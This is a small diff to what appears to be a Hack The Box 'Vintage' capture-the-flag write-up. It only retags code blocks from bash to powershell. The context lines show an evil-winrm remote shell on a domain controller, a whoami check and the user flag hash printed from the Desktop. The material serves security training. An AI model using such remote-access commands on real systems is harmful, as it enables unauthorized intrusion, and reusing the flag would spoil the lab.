@@ -646,7 +646,7 @@ Valid starting       Expires              Service principal
 evil-winrm -i dc01.vintage.htb -r vintage.htb
 
 ```
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> whoami
 vintage\c.neri
@@ -656,7 +656,7 @@ vintage\c.neri
 
 > I get the **first** flag in the directory - `C:\Users\C.Neri\Desktop`:
 
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Desktop> type user.txt
 84423b2ea0027a0279aaf355af95d094
